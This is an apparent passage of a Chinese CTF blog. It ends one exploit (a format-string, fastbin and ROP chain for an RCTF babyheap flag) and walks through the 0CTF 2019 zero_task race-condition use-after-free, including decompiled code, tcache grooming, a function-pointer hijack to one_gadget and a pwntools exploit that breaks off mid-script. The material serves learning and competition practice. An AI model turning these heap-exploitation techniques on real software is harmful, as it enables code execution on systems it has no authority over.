class="line">fake_stack_chunk=stack_addr+0x40-0x8</span><br><span class="line">success(<span class="string">"fake_stack_chunk ==&gt; 0x%x"</span>%fake_stack_chunk)</span><br><span class="line"></span><br><span class="line">edit(1,'%48c%18$lln')</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">ptr_addr=0x202110+text_base</span><br><span class="line">success(<span class="string">"ptr_addr ==&gt; 0x%x"</span>%ptr_addr)</span><br><span class="line">edit(10,'\x00'*0x808+p64(0)+'\x00'*0x48+p64(0x12345678))<span class="comment">#free_hook ==&gt; 0</span></span><br><span class="line">edit(5,p64(0)+p64(0x31)+'A'*0x20+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x30)+p64(fake_stack_chunk))</span><br><span class="line">add(0x28)<span class="comment">#0</span></span><br><span class="line">add(0x28)<span class="comment">#1 get fake chunk</span></span><br><span class="line">edit(1,p64(ptr_addr+2))</span><br><span class="line"></span><br><span class="line">edit(10,'\x00'*0x808+p64(printf_addr))<span class="comment"># free_hook ==&gt; printf</span></span><br><span class="line">edit(2,<span class="string">"%23$sA"</span>)</span><br><span class="line">delete(2)</span><br><span class="line">mmap_addr='\x00\x00'+a.recvuntil(<span class="string">"A"</span>,drop=True)</span><br><span class="line">mmap_addr=u64(mmap_addr.ljust(8,'\x00'))</span><br><span class="line">success(<span class="string">"mmap_addr ==&gt; 0x%x"</span>%mmap_addr)</span><br><span class="line"></span><br><span class="line">edit(10,'\x00'*0x808+p64(0))<span class="comment"># __free_hook ==&gt; 0</span></span><br><span class="line">edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21))</span><br><span class="line">delete(0)</span><br><span class="line">edit(5,p64(0)+p64(0x71)+p64(mmap_addr+0x70))</span><br><span class="line">add(0x68)<span class="comment">#0</span></span><br><span class="line">add(0x68)<span class="comment">#2 get mmap , 修改8 ， 9 ， 10 。。。。</span></span><br><span class="line">dest_addr=stack_addr+0x28</span><br><span class="line"></span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">pop_rdi_ret=text_base+0x1433</span><br><span class="line">pop_rsi_r15_ret=text_base+0x1431</span><br><span class="line">read_got=text_base+0x201F98</span><br><span class="line">push_rax_ret=libc_base+0x00000000000348fd</span><br><span class="line">pop_rsi_ret=libc_base+0x202e8</span><br><span class="line">pop_rdx_ret=libc_base+0x1b92</span><br><span class="line">pop_rdi_pop_rbp_ret=libc_base+0x20256</span><br><span class="line">xchg_eax_edi_ret=libc_base+0x00000000000b0aa4</span><br><span class="line"><span class="comment">#ROP chain</span></span><br><span class="line">payload=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(dest_addr+18*8+0xd)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+=p64(0x4)</span><br><span class="line">payload+=p64(open_addr)</span><br><span class="line">payload+=p64(xchg_eax_edi_ret)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+='A'*0xd</span><br><span class="line">payload+=p64(dest_addr+20*8)</span><br><span class="line">payload+=p64(pop_rdx_ret)</span><br><span class="line">payload+=p64(0x10)</span><br><span class="line">payload+=p64(read_addr)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+=p64(dest_addr+20*8)</span><br><span class="line">payload+=p64(pop_rdx_ret)</span><br><span class="line">payload+=p64(0x10)</span><br><span class="line">payload+=p64(write_addr)</span><br><span class="line">payload+=<span class="string">"/mnt/hgfs/Desktop/rctf/babyheap/flag\x00"</span></span><br><span class="line">edit(2,p64(dest_addr)+p64(0x200)) </span><br><span class="line">edit(8,payload)<span class="comment">#在返回地址处填入ROP</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/20/zero-task条件竞争利用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/20/zero-task条件竞争利用/" itemprop="url">zero_task条件竞争利用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-20T22:25:01+08:00">
                2019-05-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.6k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  7
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>跟着别人的wp复现了0CTF 2019中所谓的最简单的一道pwn题（真tm难，大佬们太强了），顺面学习了一波条件竞争的利用.</p>
<blockquote>
<p>参考了 <a href="https://www.anquanke.com/post/id/175401#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175401#h3-4</a></p>
</blockquote>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析:"></a>程序分析:</h4><p>从来没做过一次add函数出来这么多chunk的题目，程序本身也看了半天才理清楚。功能是就是加解密。还有目标libc版本是2.27</p>
<h5 id="add-task"><a href="#add-task" class="headerlink" title="add_task:"></a>add_task:</h5><p>add函数会从上到下依次创建4个chunk:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">存放信息的 task_info结构体 （<span class="number">0x80</span> <span class="keyword">byte</span>）</span><br><span class="line">EVP_CIPHER_CTX_new 产生的 EVP_CIPHER_CTX对象  （<span class="number">0xb0</span> <span class="keyword">byte</span>）</span><br><span class="line">EVP_CIPHER_CTX对象 创建的chunk  （<span class="number">0x110</span> <span class="keyword">byte</span>）</span><br><span class="line">存放data的chunk （根据用户输入的<span class="built_in">size</span>创建）</span><br></pre></td></tr></table></figure></p>
<p>task_info结构体如下:<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>chunk_info      struc ; (sizeof=<span class="number">0</span>x70, mappedto_7)</span><br><span class="line"><span class="symbol">00000000 </span>data_ptr        dq ?</span><br><span class="line"><span class="symbol">00000008 </span>size            dq ?</span><br><span class="line"><span class="symbol">00000010 </span>choice          dd ?</span><br><span class="line"><span class="symbol">00000014 </span><span class="keyword">Key</span>             db <span class="number">32</span> dup(?)</span><br><span class="line"><span class="symbol">00000034 </span>IV              db <span class="number">16</span> dup(?)</span><br><span class="line"><span class="symbol">00000044 </span>unkonwn         db <span class="number">20</span> dup(?)</span><br><span class="line"><span class="symbol">00000058 </span>EVP_CIPHER_CTX_ptr dq ?</span><br><span class="line"><span class="symbol">00000060 </span>task_ID         dq ?</span><br><span class="line"><span class="symbol">00000068 </span>fd              dq ?</span><br><span class="line"><span class="symbol">00000070 </span>chunk_info      ends</span><br></pre></td></tr></table></figure></p>
<p>其中choice就是加密还是解密（1是加密，2是解密）.<br>这个结构体也是使用单向链表串起来的，插入方式是头插法. fd 指向上一个task<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s-&gt;fd = link_head<span class="comment">;</span></span><br><span class="line"><span class="attribute">result</span> = s<span class="comment">;</span></span><br><span class="line">link_head = (__int64)s<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<h5 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数:"></a>delete函数:</h5><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> <span class="type">Delete</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> task_id; // [rsp+<span class="type">Ch</span>] [rbp-<span class="number">14</span>h]</span><br><span class="line">  <span class="built_in">void</span> **<span class="keyword">ptr</span>; // [rsp+<span class="number">10</span>h] [rbp-<span class="number">10</span>h]</span><br><span class="line">  __int64 v2; // [rsp+<span class="number">18</span>h] [rbp-<span class="number">8</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">ptr</span> = (<span class="built_in">void</span> **)link_head;</span><br><span class="line">  v2 = link_head;</span><br><span class="line">  printf(<span class="string">"Task id : "</span>);</span><br><span class="line">  task_id = read_and_str2int();</span><br><span class="line">  <span class="keyword">if</span> ( link_head &amp;&amp; task_id == *(_DWORD *)(link_head + <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    link_head = *(_QWORD *)(link_head + <span class="number">104</span>);   // =fd</span><br><span class="line">    <span class="type">EVP_CIPHER_CTX_free</span>(<span class="keyword">ptr</span>[<span class="number">11</span>]);</span><br><span class="line">    free(*<span class="keyword">ptr</span>);                                 // data_chunk</span><br><span class="line">    free(<span class="keyword">ptr</span>);                                  // chunk_info</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="keyword">ptr</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( task_id == *((_DWORD *)<span class="keyword">ptr</span> + <span class="number">24</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(v2 + <span class="number">104</span>) = <span class="keyword">ptr</span>[<span class="number">13</span>];</span><br><span class="line">        <span class="type">EVP_CIPHER_CTX_free</span>(<span class="keyword">ptr</span>[<span class="number">11</span>]);</span><br><span class="line">        free(*<span class="keyword">ptr</span>);</span><br><span class="line">        free(<span class="keyword">ptr</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = (__int64)<span class="keyword">ptr</span>;</span><br><span class="line">      <span class="keyword">ptr</span> = (<span class="built_in">void</span> **)<span class="keyword">ptr</span>[<span class="number">13</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里free过后并没有将指针清为NULL，看似有UAF，其实没有，由于该结构体是用链表串起来的，free过后，就将该结构体从链表中除去，所以下次free的时候就找不到了。delete函数这里没有啥问题。</p>
<h5 id="go函数"><a href="#go函数" class="headerlink" title="go函数:"></a>go函数:</h5><p>根据用户输入的task_id，找到对应的task结构体，然后创建一个新的线程，来进行加解密:<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"Task id : "</span>);</span><br><span class="line">task_id = read_and_str2int();</span><br><span class="line"><span class="keyword">for</span> ( <span class="built_in">arg</span> = (chunk_info *)link_head; <span class="built_in">arg</span>; <span class="built_in">arg</span> = (chunk_info *)<span class="built_in">arg</span>-&gt;fd )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( task_id == LODWORD(<span class="built_in">arg</span>-&gt;task_ID) )</span><br><span class="line">  &#123;</span><br><span class="line">    pthread_create(&amp;newthread, <span class="number">0</span>LL, (void *(*)(void *))start_routine, <span class="built_in">arg</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>start_routine函数:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  v2 = (unsigned __int64)a1;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>LL;</span><br><span class="line">  v4 = <span class="number">0</span>LL;</span><br><span class="line">  puts(<span class="string">"Prepare..."</span>);</span><br><span class="line">  sleep(<span class="number">2</span>u);</span><br><span class="line">  memset(output_chunk, <span class="number">0</span>, <span class="number">0x1010</span>uLL);</span><br><span class="line">  if ( !(unsigned int)EVP_CipherUpdate(</span><br><span class="line">                        *(_QWORD *)(v2 + <span class="number">88</span>),   <span class="comment">// 对象</span></span><br><span class="line">                        output_chunk,</span><br><span class="line">                        &amp;v1,</span><br><span class="line">                        *(_QWORD *)v2,          <span class="comment">// data_ptr</span></span><br><span class="line">                        (unsigned int)*(_QWORD *)(v2 + <span class="number">8</span>)) )<span class="comment">// size</span></span><br><span class="line">    pthread_exit(<span class="number">0</span>LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  if ( !(unsigned int)EVP_CipherFinal_ex(*(_QWORD *)(v2 + <span class="number">88</span>), (char *)output_chunk + *((_QWORD *)&amp;v2 + <span class="number">1</span>), &amp;v1) )</span><br><span class="line">    pthread_exit(<span class="number">0</span>LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  puts(<span class="string">"Ciphertext: "</span>);</span><br><span class="line">  sub_107B(stdout, (__int64)output_chunk, *((unsigned __int64 *)&amp;v2 + <span class="number">1</span>), <span class="number">0x10</span>uLL, <span class="number">1</span>uLL);</span><br><span class="line">  pthread_exit(<span class="number">0</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>该函数在调用加解密函数之前sleep了两秒，这里就存在条件竞争。可以调用go函数之后，delete掉正在进行加解密的task，这样就可以造成UAF。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路:"></a>利用思路:</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">go</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>go(1)后delete掉1，那么task_1的task_info中的第一项数据就会被修改成task_0的task_info_chunk的地址：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># [<span class="number">0x80</span>] : task_1 -&gt; task_0</span><br></pre></td></tr></table></figure></p>
<p>注意task_info结构体的第一项是data_ptr,这样的话task_1进行加密的时候，就会把从task_0的task_info开始的空间当做 data来进行加密，就会造成leak。<br>但是delete掉task_1后，task_1生成的 EVP_CIPHER_CTX 和EVP_CIPHER_CTX生成的chunk都会被free掉，这样加密就会出错，我们需要delete掉task_1后,申请chunk，将task_1的EVP_CIPHER_CTX重新申请回来确保加密过程的顺利执行.<br>具体过程:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">4</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">go</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>此时tcache的情况如下:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x80</span>]  :  <span class="number">3</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">0</span></span><br><span class="line">[<span class="number">0xb0</span>]  :  <span class="number">3</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">0</span></span><br><span class="line">[<span class="number">0x110</span>] :  <span class="number">3</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<p>然后<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">add</span>(5,<span class="attribute">data_size</span>=0xa0)#申请到的data chunk size为0xb0,该task会申请两个 size为0xb0的chunk</span><br><span class="line"><span class="builtin-name">add</span>(6)</span><br></pre></td></tr></table></figure></p>
<p>此时tcache的情况如下:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span><span class="function"><span class="title">x80</span>]  : 1-&gt;</span> <span class="number">0</span> </span><br><span class="line">[<span class="number">0</span>xb0]  : <span class="number">0</span></span><br><span class="line">[<span class="number">0</span><span class="function"><span class="title">x110</span>] : 1-&gt;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<p>这样就把task_1的EVP_CIPHER_CTX重新申请回来了，新创建的EVP_CIPHER_CTX对象就会重新创建一个chunk，之前的task_1的EVP_CIPHER_CTX对象创建的chunk就不用再管他了。<br>这样还不会申请到task_1的task_info chunk,不会破坏掉data_ptr.</p>
<h4 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流:"></a>劫持执行流:</h4><p>根据wp得知 EVP_EncryptUpdate 会调用EVP_CIPHER_CTX对象创建的chunk中的函数指针</p>
<p>EVP_EncryptUpdate:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">12h</span>], <span class="number">10h</span></span><br><span class="line"><span class="keyword">jz</span>      short loc_1208E8</span><br><span class="line"><span class="keyword">movsxd</span>  <span class="built_in">rcx</span>, <span class="built_in">r8d</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">r12</span></span><br><span class="line"><span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">20h</span>]</span><br></pre></td></tr></table></figure>
<p>其中rax就是EVP_CIPHER_CTX对象创建的chunk的地址.然后会调用 rax+0x20处的函数，那么可以利用条件竞争造成的UAF修改此处为one_gadget，劫持执行流。<br>伪代码如下:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v9 = *(<span class="name">_QWORD</span> *)a1;</span><br><span class="line">if ( *(<span class="name">_BYTE</span> *)(*(<span class="name">_QWORD</span> *)a1 + 18LL) &amp; 0x10 )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = (*(<span class="name">__int64</span> (<span class="name">__fastcall</span> **)(<span class="name">signed</span> int *, __int64, char *, _QWORD))(<span class="name">v9</span> + <span class="number">32</span>))(<span class="name">a1</span>, a2, a4, a5)<span class="comment">;</span></span><br><span class="line">  if ( <span class="name">v10</span> &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v7 = v10;</span><br><span class="line">    return 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本:"></a>利用脚本:</h4><p>参考的文章提供的wp没法打通，可能是环境问题，我在他的思路下重新写了exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding= utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">a=process(<span class="string">"./task"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./task"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">IV=<span class="string">'A'</span>*<span class="number">16</span></span><br><span class="line">KEY=<span class="string">'A'</span>*<span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    set scheduler-locking on</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x00000000000141D)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000001521)</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="comment">#add,delete</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(id,choice,size,data,key=KEY,iv=IV,is_go=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_go==<span class="keyword">False</span>:</span><br><span class="line">        menu(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a.sendline(<span class="string">"1"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Task id : "</span>)</span><br><span class="line">    a.sendline(str(id))</span><br><span class="line">    a.recvuntil(<span class="string">"Encrypt(1) / Decrypt(2): "</span>)</span><br><span class="line">    a.sendline(str(choice))</span><br><span class="line">    a.recvuntil(<span class="string">"Key : "</span>)</span><br><span class="line">    a.send(key)</span><br><span class="line">    a.recvuntil(<span class="string">"IV : "</span>)</span><br><span class="line">    a.send(IV)</span><br><span class="line">    a.recvuntil(<span class="string">"Data Size : "</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"Data : "</span>)</span><br><span class="line">    a.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Task id : "</span>)</span><br><span class="line">    a.sendline(str(id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(id)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Task id : "</span>)</span><br><span class="line">    a.sendline(str(id))</span><br><span class="line"><span class="comment"># chunk_info 0x80 , EVP_CIPHER_CTX 0xb0, EVP_CIPHER_CTX建的chunk 0x110 , data_chunk size可控</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span 